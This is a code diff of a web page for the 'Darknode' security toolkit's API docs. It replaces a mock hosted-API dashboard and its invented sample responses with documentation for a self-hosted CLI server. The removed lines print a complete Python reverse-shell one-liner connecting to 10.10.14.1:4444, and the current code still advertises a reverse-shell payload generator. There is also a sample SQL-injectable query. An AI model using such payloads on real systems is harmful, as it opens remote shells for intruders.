@@ -1,40 +1,44 @@
-// Darknode API dashboard — key management, interactive docs, usage stats, code examples.
-import { db } from "/js/firebase.js?v=20261007a";
-import { doc, getDoc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-firestore.js";
+// Darknode API page. The HOSTED REST API does not exist yet (it ships with the workspace
+// ingest API), so this page says so and issues no keys. What does work today is the
+// self-hosted server in the Darknode CLI (darknode-cli lib/cli/api-server.js, started with
+// `darknode api start`); the endpoints, request bodies and response fields below are the
+// ones that server actually implements.
 
 const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
 
-function genKey() {
-  const hex = Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2, "0")).join("");
-  return "sk-darknode-" + hex;
-}
+const BASE = "http://localhost:8080";
 
 const ENDPOINTS = [
-  { method: "POST", path: "/api/v1/scan/url", desc: "Scan a URL for vulnerabilities",
-    reqBody: { url: "https://target.com", depth: 2 },
-    resBody: { status: "complete", findings: [{ severity: "high", title: "SQL Injection", url: "https://target.com/login?id=1", detail: "Parameter 'id' is vulnerable to UNION-based SQLi" }] } },
-  { method: "POST", path: "/api/v1/scan/code", desc: "Scan code for security issues",
-    reqBody: { code: "app.get('/user', (req, res) => { db.query('SELECT * FROM users WHERE id=' + req.query.id) })", language: "javascript" },
-    resBody: { status: "complete", findings: [{ severity: "critical", title: "SQL Injection", line: 1, detail: "User input concatenated into SQL query" }] } },
-  { method: "POST", path: "/api/v1/osint/domain", desc: "OSINT lookup on a domain",
+  { path: "/api/v1/scan/url", desc: "Header, DNS, certificate and subdomain recon for a URL's host",
+    reqBody: { url: "https://example.com" },
+    returns: "status, url, host, headers, dns, certificate, subdomains[]" },
+  { path: "/api/v1/scan/code", desc: "Pattern scan of a code snippet (eval/exec, SQL concatenation, innerHTML, hardcoded secrets)",
+    reqBody: { code: "db.query('SELECT * FROM users WHERE id=' + req.query.id)", language: "javascript" },
+    returns: "status, language, findings[] of { severity, title, line, detail }" },
+  { path: "/api/v1/osint/domain", desc: "DNS, WHOIS, subdomains and HTTP headers for a domain",
     reqBody: { domain: "example.com" },
-    resBody: { domain: "example.com", ips: ["93.184.216.34"], subdomains: ["www", "mail", "api"], mx: ["mail.example.com"], technologies: ["nginx", "PHP"], registrar: "IANA" } },
-  { method: "POST", path: "/api/v1/osint/email", desc: "Check email in breach databases",
+    returns: "domain, dns, whois, subdomains[], headers" },
+  { path: "/api/v1/osint/email", desc: "DNS records for an email address's domain (no breach lookup)",
     reqBody: { email: "test@darknode.ai" },
-    resBody: { email: "test@darknode.ai", breached: true, breaches: [{ name: "ExampleBreach", date: "2023-01-15", records: 50000 }], pasteCount: 2 } },
-  { method: "POST", path: "/api/v1/hash/crack", desc: "Identify and lookup a hash",
-    reqBody: { hash: "5d41402abc4b2a76b9719d911017c592" },
-    resBody: { hash: "5d41402abc4b2a76b9719d911017c592", type: "MD5", cracked: true, plaintext: "hello" } },
-  { method: "POST", path: "/api/v1/encode", desc: "Encode or decode data",
+    returns: "email, domain, dns, note" },
+  { path: "/api/v1/hash/crack", desc: "Digests (MD5, SHA-1, SHA-256, ...) of the input text; it does not crack hashes",
+    reqBody: { hash: "hello" },
+    returns: "hash, output" },
+  { path: "/api/v1/encode", desc: "Encode or decode: base64, hex, url, base32, base58, rot13",
     reqBody: { data: "hello world", operation: "encode", format: "base64" },
-    resBody: { result: "aGVsbG8gd29ybGQ=", format: "base64", operation: "encode" } },
-  { method: "POST", path: "/api/v1/generate/payload", desc: "Generate a reverse shell payload",
-    reqBody: { type: "reverse-shell", language: "python", lhost: "10.10.14.1", lport: 4444 },
-    resBody: { payload: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.14.1\",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn(\"/bin/bash\")'", language: "python", type: "reverse-shell" } },
-  { method: "POST", path: "/api/v1/ai/ask", desc: "Ask the security AI a question",
-    reqBody: { question: "How do I test for blind SQL injection?", context: "web application pentest" },
-    resBody: { answer: "Blind SQLi can be detected using boolean-based or time-based techniques...", sources: ["OWASP Testing Guide", "PortSwigger Web Academy"] } },
+    returns: "result, format, operation" },
+  { path: "/api/v1/generate/payload", desc: "Reverse-shell payloads for a language with your LHOST/LPORT filled in",
+    reqBody: { language: "python", lhost: "10.10.14.1", lport: 4444 },
+    returns: "type, language, lhost, lport, output" },
+  { path: "/api/v1/ai/ask", desc: "Ask the Nexus AI engine (needs an AI provider configured in the CLI)",
+    reqBody: { question: "How do I test for blind SQL injection?" },
+    returns: "answer, engine" },
 ];
+
+const curlFor = (path, body) => `curl -X POST ${BASE}${path} \\
+  -H "Content-Type: application/json" \\
+  -H "X-API-Key: $DARKNODE_API_TOKEN" \\
+  -d '${JSON.stringify(body)}'`;
 
 const TIERS = [
   { name: "Free", price: "$0", calls: "forever", features: ["All endpoints", "Community support", "BYOK — bring your own API key", "Full security toolset", "5 MCP server integrations"] },
@@ -44,62 +48,37 @@ const TIERS = [
 ];
 
 export async function renderAPI(main, user) {
-  // Load user's API key from Firestore
-  let apiKey = "";
-  let usage = { calls: 0, lastCall: null };
-  try {
-    const userDoc = await getDoc(doc(db, "users", user.uid));
-    if (userDoc.exists()) {
-      const d = userDoc.data();
-      apiKey = d.apiKey || "";
-      usage = d.apiUsage || { calls: 0, lastCall: null };
-    }
-  } catch (_) {}
-
-  const masked = apiKey ? apiKey.slice(0, 14) + "*".repeat(20) : "";
-
   main.innerHTML = `
     <h1 class="pg-h1">Darknode API</h1>
-    <p class="muted pg-sub">Integrate security scanning, OSINT, and AI into your workflow. Authenticate with your API key.</p>
+    <p class="muted pg-sub">The hosted REST API is not available yet &mdash; it ships with the workspace ingest API. The same endpoints run today on your own machine with the Darknode CLI.</p>
 
-    <div class="api-key-section">
-      <div class="panel">
-        <div class="panel-h"><h2 class="pg-h2" style="margin:0">Your API Key</h2></div>
-        ${apiKey ? `
-          <div class="api-key-row">
-            <input class="api-key-input mono" id="apiKeyDisplay" type="password" value="${esc(apiKey)}" readonly>
-            <button class="btn ghost sm" id="apiKeyReveal">Reveal</button>
-            <button class="btn ghost sm" id="apiKeyCopy">Copy</button>
-          </div>
-          <div class="api-usage" style="margin-top:12px">
-            <div class="set-row"><span class="muted">Calls this month</span><span>${usage.calls} / 100</span></div>
-            <div class="api-meter"><div style="width:${Math.min(100, usage.calls)}%"></div></div>
-            <div class="set-row"><span class="muted">Last call</span><span>${usage.lastCall ? new Date(usage.lastCall).toLocaleString() : "Never"}</span></div>
-          </div>
-          <button class="btn danger sm" id="apiKeyRegen" style="margin-top:10px">Regenerate key</button>
-        ` : `
-          <p class="muted" style="font-size:.85rem">Generate an API key to start using the Darknode API.</p>
-          <button class="btn" id="apiKeyGen">Generate API Key</button>
-        `}
-        <p class="adm-msg" id="apiKeyMsg" style="margin-top:8px"></p>
-      </div>
+    <div class="panel">
+      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Hosted API</h2><span class="muted" style="font-size:.82rem">Not available yet</span></div>
+      <p style="font-size:.88rem;line-height:1.7;margin:0">There is no hosted endpoint and there are no hosted API keys yet; they ship with the workspace ingest API. Until then, run the self-hosted server below. It needs no Darknode account.</p>
     </div>
 
     <div class="panel" style="margin-top:16px">
-      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Quick Start</h2></div>
+      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Self-hosted quick start</h2></div>
       <div class="api-code-block">
-        <div class="api-code-header">curl</div>
+        <div class="api-code-header">bash</div>
         <button class="api-code-copy" data-copy="quickstart">Copy</button>
-        <pre><code>curl -X POST https://darknode-api.onrender.com/api/v1/scan/url \\
-  -H "Content-Type: application/json" \\
-  -H "X-API-Key: ${esc(apiKey || "YOUR_API_KEY")}" \\
-  -d '{"url": "https://target.com"}'</code></pre>
+        <pre><code id="quickstart"># Get the Darknode CLI (Node 18+)
+git clone https://github.com/Darknode-Official/darknode-cli
+cd darknode-cli &amp;&amp; npm install
+
+# Start the API server. With DARKNODE_API_TOKEN set, every request must send it.
+export DARKNODE_API_TOKEN="choose-a-long-secret"
+node darknode.js api start --port 8080
+
+# In another terminal (export the same DARKNODE_API_TOKEN first)
+curl ${BASE}/health -H "X-API-Key: $DARKNODE_API_TOKEN"
+${esc(curlFor(ENDPOINTS[0].path, ENDPOINTS[0].reqBody))}</code></pre>
       </div>
     </div>
 
     <div class="panel" style="margin-top:16px">
-      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Endpoints</h2></div>
-      <p class="muted" style="font-size:.82rem;margin:0 0 12px">All endpoints accept JSON and require the <code>X-API-Key</code> header.</p>
+      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Endpoints (self-hosted)</h2></div>
+      <p class="muted" style="font-size:.82rem;margin:0 0 12px">Served by <code>darknode api start</code> on your machine. All take a JSON body; <code>GET /health</code> lists them.</p>
       <div id="apiEndpoints">
         ${ENDPOINTS.map((ep, i) => `
           <div class="api-endpoint" data-idx="${i}">
@@ -118,20 +97,14 @@ export async function renderAPI(main, user) {
                 </div>
               </div>
               <div class="api-ep-section">
-                <div class="api-ep-label">Response</div>
-                <div class="api-code-block">
-                  <div class="api-code-header">200 OK</div>
-                  <pre><code>${esc(JSON.stringify(ep.resBody, null, 2))}</code></pre>
-                </div>
+                <div class="api-ep-label">Response fields</div>
+                <p class="mono" style="font-size:.82rem;margin:0">${esc(ep.returns)}</p>
               </div>
               <div class="api-ep-section">
                 <div class="api-ep-label">curl</div>
                 <div class="api-code-block">
                   <button class="api-code-copy" data-copy="curl-${i}">Copy</button>
-                  <pre><code id="curl-${i}">curl -X POST https://darknode-api.onrender.com${esc(ep.path)} \\
-  -H "Content-Type: application/json" \\
-  -H "X-API-Key: ${esc(apiKey || "YOUR_API_KEY")}" \\
-  -d '${JSON.stringify(ep.reqBody)}'</code></pre>
+                  <pre><code id="curl-${i}">${esc(curlFor(ep.path, ep.reqBody))}</code></pre>
                 </div>
               </div>
             </div>
@@ -141,19 +114,15 @@ export async function renderAPI(main, user) {
     </div>
 
     <div class="panel" style="margin-top:16px">
-      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Code Examples</h2></div>
+      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Code Examples (self-hosted)</h2></div>
       <div class="api-code-tabs">
         <button class="api-tab on" data-lang="curl">curl</button>
         <button class="api-tab" data-lang="python">Python</button>
         <button class="api-tab" data-lang="javascript">JavaScript</button>
-        <button class="api-tab" data-lang="go">Go</button>
       </div>
       <div class="api-code-block" id="codeExampleBlock">
         <button class="api-code-copy" data-copy="codeExample">Copy</button>
-        <pre><code id="codeExample">${esc(`curl -X POST https://darknode-api.onrender.com/api/v1/scan/url \\
-  -H "Content-Type: application/json" \\
-  -H "X-API-Key: ${apiKey || "YOUR_API_KEY"}" \\
-  -d '{"url": "https://target.com"}'`)}</code></pre>
+        <pre><code id="codeExample">${esc(curlFor(ENDPOINTS[0].path, ENDPOINTS[0].reqBody))}</code></pre>
       </div>
     </div>
 
@@ -172,80 +141,13 @@ export async function renderAPI(main, user) {
     </div>
 
     <div class="panel" style="margin-top:16px">
-      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Authentication</h2></div>
-      <p style="font-size:.88rem;line-height:1.7">Include your API key in every request as an <code>X-API-Key</code> header:</p>
-      <div class="api-code-block">
-        <pre><code>X-API-Key: ${esc(apiKey || "sk-darknode-your-key-here")}</code></pre>
-      </div>
-      <p style="font-size:.85rem;line-height:1.7;margin-top:10px">
-        Requests without a valid key return <code>401 Unauthorized</code>.
-        Keys are scoped to your account and can be regenerated at any time.
-        Keep your key secret — treat it like a password.
-      </p>
-    </div>
-
-    <div class="panel" style="margin-top:16px">
-      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Self-Hosted Mode</h2></div>
-      <p style="font-size:.88rem;line-height:1.7">Run the API on your own machine for unlimited, private access. No data leaves your network.</p>
-      <div class="api-code-block">
-        <div class="api-code-header">bash</div>
-        <pre><code># Install the Darknode CLI
-curl -fsSL https://darknode.sh/install | sh
-
-# Start the API server locally
-darknode api start --port 8080
-
-# Now use localhost instead of the cloud endpoint
-curl -X POST http://localhost:8080/api/v1/scan/url \\
-  -H "Content-Type: application/json" \\
-  -d '{"url": "https://target.com"}'</code></pre>
-      </div>
+      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Authentication (self-hosted)</h2></div>
+      <p style="font-size:.88rem;line-height:1.7">The server checks the <code>X-API-Key</code> header only when it was started with <code>DARKNODE_API_TOKEN</code> set; a missing or wrong key then returns <code>401</code>. Without the variable it accepts every request.</p>
+      <p style="font-size:.85rem;line-height:1.7;margin-top:10px">It listens on all interfaces (0.0.0.0), so always set a token on a machine other hosts can reach.</p>
     </div>
   `;
 
   const $ = (id) => main.querySelector(id);
-
-  // Key management
-  const genBtn = $("#apiKeyGen");
-  if (genBtn) genBtn.onclick = async () => {
-    const key = genKey();
-    try {
-      await setDoc(doc(db, "users", user.uid), { apiKey: key, apiUsage: { calls: 0, lastCall: null }, apiKeyCreated: serverTimestamp() }, { merge: true });
-      renderAPI(main, user);
-    } catch (e) {
-      const msg = $("#apiKeyMsg"); if (msg) msg.textContent = "Failed: " + e.message;
-    }
-  };
-
-  const regenBtn = $("#apiKeyRegen");
-  if (regenBtn) regenBtn.onclick = async () => {
-    const ok = window.dnConfirm
-      ? await window.dnConfirm("Regenerate API key?", "Your current key stops working immediately and any integrations using it will break until you update them.", { submitText: "Regenerate", danger: true })
-      : true;
-    if (!ok) return;
-    const key = genKey();
-    try {
-      await setDoc(doc(db, "users", user.uid), { apiKey: key, apiUsage: { calls: 0, lastCall: null }, apiKeyCreated: serverTimestamp() }, { merge: true });
-      renderAPI(main, user);
-    } catch (e) {
-      const msg = $("#apiKeyMsg"); if (msg) msg.textContent = "Failed: " + e.message;
-    }
-  };
-
-  const revealBtn = $("#apiKeyReveal");
-  if (revealBtn) revealBtn.onclick = () => {
-    const inp = $("#apiKeyDisplay");
-    if (!inp) return;
-    if (inp.type === "password") { inp.type = "text"; revealBtn.textContent = "Hide"; }
-    else { inp.type = "password"; revealBtn.textContent = "Reveal"; }
-  };
-
-  const copyBtn = $("#apiKeyCopy");
-  if (copyBtn) copyBtn.onclick = () => {
-    navigator.clipboard?.writeText(apiKey);
-    copyBtn.textContent = "Copied!";
-    setTimeout(() => { copyBtn.textContent = "Copy"; }, 1200);
-  };
 
   // Endpoint toggles
   main.querySelectorAll(".api-endpoint").forEach(ep => {
@@ -275,68 +177,27 @@ curl -X POST http://localhost:8080/api/v1/scan/url \\
 
   // Language tabs
   const CODE_EXAMPLES = {
-    curl: `curl -X POST https://darknode-api.onrender.com/api/v1/scan/url \\
-  -H "Content-Type: application/json" \\
-  -H "X-API-Key: ${apiKey || "YOUR_API_KEY"}" \\
-  -d '{"url": "https://target.com"}'`,
+    curl: curlFor(ENDPOINTS[0].path, ENDPOINTS[0].reqBody),
 
-    python: `import requests
+    python: `import os, requests
 
 response = requests.post(
-    "https://darknode-api.onrender.com/api/v1/scan/url",
-    headers={
-        "Content-Type": "application/json",
-        "X-API-Key": "${apiKey || "YOUR_API_KEY"}"
-    },
-    json={"url": "https://target.com"}
+    "${BASE}/api/v1/scan/url",
+    headers={"X-API-Key": os.environ.get("DARKNODE_API_TOKEN", "")},
+    json={"url": "https://example.com"},
 )
+print(response.status_code, response.json())`,
 
-findings = response.json()["findings"]
-for f in findings:
-    print(f"{f['severity']}: {f['title']} - {f['detail']}")`,
-
-    javascript: `const response = await fetch(
-  "https://darknode-api.onrender.com/api/v1/scan/url",
-  {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "X-API-Key": "${apiKey || "YOUR_API_KEY"}"
-    },
-    body: JSON.stringify({ url: "https://target.com" })
-  }
-);
-
-const { findings } = await response.json();
-findings.forEach(f =>
-  console.log(\`\${f.severity}: \${f.title} - \${f.detail}\`)
-);`,
-
-    go: `package main
-
-import (
-    "bytes"
-    "encoding/json"
-    "fmt"
-    "net/http"
-)
-
-func main() {
-    body, _ := json.Marshal(map[string]string{"url": "https://target.com"})
-    req, _ := http.NewRequest("POST",
-        "https://darknode-api.onrender.com/api/v1/scan/url",
-        bytes.NewBuffer(body))
-    req.Header.Set("Content-Type", "application/json")
-    req.Header.Set("X-API-Key", "${apiKey || "YOUR_API_KEY"}")
-
-    resp, err := http.DefaultClient.Do(req)
-    if err != nil { panic(err) }
-    defer resp.Body.Close()
-
-    var result map[string]interface{}
-    json.NewDecoder(resp.Body).Decode(&result)
-    fmt.Println(result)
-}`,
+    javascript: `// Node 18+
+const response = await fetch("${BASE}/api/v1/scan/url", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    "X-API-Key": process.env.DARKNODE_API_TOKEN || ""
+  },
+  body: JSON.stringify({ url: "https://example.com" })
+});
+console.log(response.status, await response.json());`,
   };
 
   main.querySelectorAll(".api-tab").forEach(tab => {
